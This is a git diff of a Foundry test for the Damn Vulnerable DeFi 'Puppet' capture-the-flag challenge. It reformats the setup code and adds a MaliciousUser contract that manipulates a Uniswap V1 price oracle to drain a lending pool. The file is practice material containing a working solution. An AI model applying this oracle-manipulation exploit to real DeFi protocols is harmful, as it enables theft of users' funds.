@@ -43,24 +43,40 @@ contract PuppetChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy a exchange that will be used as the factory template
-        IUniswapV1Exchange uniswapV1ExchangeTemplate =
-            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));
+        IUniswapV1Exchange uniswapV1ExchangeTemplate = IUniswapV1Exchange(
+            deployCode(
+                string.concat(
+                    vm.projectRoot(),
+                    "/builds/uniswap/UniswapV1Exchange.json"
+                )
+            )
+        );
 
         // Deploy factory, initializing it with the address of the template exchange
-        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
+        uniswapV1Factory = IUniswapV1Factory(
+            deployCode("builds/uniswap/UniswapV1Factory.json")
+        );
         uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));
 
         // Deploy token to be traded in Uniswap V1
         token = new DamnValuableToken();
 
         // Create a new exchange for the token
-        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));
+        uniswapV1Exchange = IUniswapV1Exchange(
+            uniswapV1Factory.createExchange(address(token))
+        );
 
         // Deploy the lending pool
-        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));
+        lendingPool = new PuppetPool(
+            address(token),
+            address(uniswapV1Exchange)
+        );
 
         // Add initial token and ETH liquidity to the pool
-        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
+        token.approve(
+            address(uniswapV1Exchange),
+            UNISWAP_INITIAL_TOKEN_RESERVE
+        );
         uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
             0, // min_liquidity
             UNISWAP_INITIAL_TOKEN_RESERVE,
@@ -82,26 +98,38 @@ contract PuppetChallenge is Test {
         assertEq(uniswapV1Exchange.tokenAddress(), address(token));
         assertEq(
             uniswapV1Exchange.getTokenToEthInputPrice(1e18),
-            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
+            _calculateTokenToEthInputPrice(
+                1e18,
+                UNISWAP_INITIAL_TOKEN_RESERVE,
+                UNISWAP_INITIAL_ETH_RESERVE
+            )
         );
         assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
-        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
+        assertEq(
+            lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
+            POOL_INITIAL_TOKEN_BALANCE * 2
+        );
     }
 
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppet() public checkSolvedByPlayer {
-        
+    function test_puppet1() public checkSolvedByPlayer {
+        MaliciousUser attacker = new MaliciousUser{value: PLAYER_INITIAL_ETH_BALANCE}(token, lendingPool, uniswapV1Exchange, recovery);
+
+        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
+        attacker.attack(POOL_INITIAL_TOKEN_BALANCE);
     }
 
     // Utility function to calculate Uniswap prices
-    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
-        private
-        pure
-        returns (uint256)
-    {
-        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
+    function _calculateTokenToEthInputPrice(
+        uint256 tokensSold,
+        uint256 tokensInReserve,
+        uint256 etherInReserve
+    ) private pure returns (uint256) {
+        return
+            (tokensSold * 997 * etherInReserve) /
+            (tokensInReserve * 1000 + tokensSold * 997);
     }
 
     /**
@@ -112,7 +140,44 @@ contract PuppetChallenge is Test {
         assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
 
         // All tokens of the lending pool were deposited into the recovery account
-        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
-        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(address(lendingPool)),
+            0,
+            "Pool still has tokens"
+        );
+        assertGe(
+            token.balanceOf(recovery),
+            POOL_INITIAL_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
     }
+}
+
+contract MaliciousUser {
+    
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    IUniswapV1Exchange uniswapV1Exchange;
+    address recovery;
+
+    constructor(
+        DamnValuableToken _token,
+        PuppetPool _lendingPool,
+        IUniswapV1Exchange _uniswapV1Exchange,
+        address _recovery 
+    ) payable {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapV1Exchange = _uniswapV1Exchange;
+        recovery = _recovery;
+    }
+
+    function attack(uint256 targetAmount) public {
+        uint256 balanceToken = token.balanceOf(address(this));
+        token.approve(address(uniswapV1Exchange), balanceToken);
+        uniswapV1Exchange.tokenToEthTransferInput(balanceToken, 9, block.timestamp, address(this));
+        lendingPool.borrow{value: address(this).balance}(targetAmount, recovery);
+    }
+
+    receive() external payable{}
 }
